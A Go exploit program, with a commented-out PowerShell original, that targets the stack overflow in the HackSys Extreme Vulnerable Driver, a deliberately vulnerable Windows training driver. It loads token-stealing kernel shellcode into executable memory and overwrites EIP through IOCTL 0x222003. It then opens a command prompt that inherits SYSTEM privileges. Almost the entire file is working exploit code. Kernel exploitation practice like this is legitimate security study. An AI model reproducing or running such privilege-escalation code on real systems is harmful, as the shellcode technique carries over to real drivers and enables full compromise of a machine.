package main

import (
	"bytes"
	"encoding/binary"
	"fmt"
	"log"
	"os/exec"
	"unsafe"

	"github.com/JamesHovious/w32"
	"github.com/davecgh/go-spew/spew"
	"golang.org/x/sys/windows"
)

/*


# Write shellcode to memory
echo "`n[>] Allocating ring0 payload.."
[IntPtr]$Pointer = [EVD]::VirtualAlloc([System.IntPtr]::Zero, $Shellcode.Length, 0x3000, 0x40)
[System.Runtime.InteropServices.Marshal]::Copy($Shellcode, 0, $Pointer, $Shellcode.Length)
$EIP = [System.BitConverter]::GetBytes($Pointer.ToInt32())
echo "[+] Payload size: $($Shellcode.Length)"
echo "[+] Payload address: $("{0:X8}" -f $Pointer.ToInt32())"

$hDevice = [EVD]::CreateFile("\\.\HacksysExtremeVulnerableDriver", [System.IO.FileAccess]::ReadWrite,[System.IO.FileShare]::ReadWrite, [System.IntPtr]::Zero, 0x3, 0x40000080, [System.IntPtr]::Zero)

if ($hDevice -eq -1) {
    echo "`n[!] Unable to get driver handle..`n"
    Return
} else {
    echo "`n[>] Driver information.."
    echo "[+] lpFileName: \\.\HacksysExtremeVulnerableDriver"
    echo "[+] Handle: $hDevice"
}

#---[EIP control]
# 0x41 = 0x800 (buffer allocated by the driver)
# 0x42 = 28 (filler)
# 0x43 = 4 (EBP)
# 0x44 = 4 (EIP)
#---
$Buffer = [Byte[]](0x41)*0x800 + [Byte[]](0x42)*28 + [Byte[]](0x43)*4 + $EIP
echo "`n[>] Sending buffer.."
echo "[+] Buffer length: $($Buffer.Length)"
echo "[+] IOCTL: 0x222003`n"
[EVD]::DeviceIoControl($hDevice, 0x222003, $Buffer, $Buffer.Length, $null, 0, [ref]0, [System.IntPtr]::Zero)|Out-null
*/

func main() {
	// Tokenstealing shellcode
	shellcode := []byte{
		//---[Setup]
		0x60,                               // pushad
		0x64, 0xA1, 0x24, 0x01, 0x00, 0x00, // mov eax, fs:[KTHREAD_OFFSET]
		0x8B, 0x40, 0x50, // mov eax, [eax + EPROCESS_OFFSET]
		0x89, 0xC1, // mov ecx, eax (Current _EPROCESS structure)
		0x8B, 0x98, 0xF8, 0x00, 0x00, 0x00, // mov ebx, [eax + TOKEN_OFFSET]
		//---[Copy System PID token]
		0xBA, 0x04, 0x00, 0x00, 0x00, // mov edx, 4 (SYSTEM PID)
		0x8B, 0x80, 0xB8, 0x00, 0x00, 0x00, // mov eax, [eax + FLINK_OFFSET] <-|
		0x2D, 0xB8, 0x00, 0x00, 0x00, // sub eax, FLINK_OFFSET           |
		0x39, 0x90, 0xB4, 0x00, 0x00, 0x00, // cmp [eax + PID_OFFSET], edx     |
		0x75, 0xED, // jnz                           ->|
		0x8B, 0x90, 0xF8, 0x00, 0x00, 0x00, // mov edx, [eax + TOKEN_OFFSET]
		0x89, 0x91, 0xF8, 0x00, 0x00, 0x00, // mov [ecx + TOKEN_OFFSET], edx
		//---[Recover]
		0x61,             // popad
		0x5D,             // pop ebp
		0xC2, 0x08, 0x00} // ret 8

	// Write shellcode to memory
	fmt.Println("[>] Allocating ring0 payload..")
	ptr, err := windows.VirtualAlloc(0, uintptr(len(shellcode)), 0x3000, 0x40)
	if err != nil {
		panic(err)
	}
	//[System.Runtime.InteropServices.Marshal]::Copy($Shellcode, 0, $Pointer, $Shellcode.Length)
	w32.CopyMemory(ptr, uintptr(unsafe.Pointer(&shellcode[0])), len(shellcode))
	fmt.Println("[+] Payload size: ", len(shellcode))
	fmt.Println("[+] Payload address: ", spew.Sdump(ptr)+"\n")
	path, err := windows.UTF16PtrFromString("\\\\.\\HacksysExtremeVulnerableDriver")
	if err != nil {
		panic(err)
	}
	hDevice, err := windows.CreateFile(path, windows.GENERIC_READ|windows.GENERIC_WRITE, 0x00001|0x00002, nil, 0x3, 0x40000080, 0)
	if err != nil {
		panic(err)
	}
	fmt.Println("[>] Driver information..")
	fmt.Println("[+] lpFileName: \\\\.\\HacksysExtremeVulnerableDriver")
	fmt.Println("[+] Handle: ", spew.Sdump(hDevice)+"\n")

	//---[EIP control]
	A := []byte{0x41} // (buffer allocated by the driver)
	B := []byte{0x42} // filler
	C := []byte{0x43} // EBP
	//D := []byte{0x44} // EIP
	//---

	size := unsafe.Sizeof(ptr)
	eip := make([]byte, size)
	switch size {
	case 4:
		binary.LittleEndian.PutUint32(eip, uint32(ptr))
	case 8:
		binary.LittleEndian.PutUint64(eip, uint64(ptr))
	default:
		panic(fmt.Sprintf("unknown uintptr size: %v", size))
	}
	fmt.Println("[+] EIP: ", eip)
	registers := [][]byte{bytes.Repeat(A, 2048), bytes.Repeat(B, 28), bytes.Repeat(C, 4), eip}

	var buffer []byte
	for _, i := range registers {
		buffer = append(buffer, i...)
	}

	fmt.Println("[>] Sending buffer..")
	fmt.Println("[+] Buffer length: ", len(buffer))
	fmt.Println("[+] IOCTL: 0x222003")

	var bytesReturned uint32
	err = windows.DeviceIoControl(hDevice, 0x222003, &buffer[0], uint32(len(buffer)), nil, 0, &bytesReturned, nil)
	if err != nil {
		panic(err)
	}

	cmd := exec.Command("cmd.exe", "/c", "start", "", "cmd.exe")
	//cmd.Stdin = strings.NewReader("some input")
	var out bytes.Buffer
	cmd.Stdout = &out
	err = cmd.Run()
	if err != nil {
		log.Fatal(err)
	}
	fmt.Printf("%q\n", out.String())
}
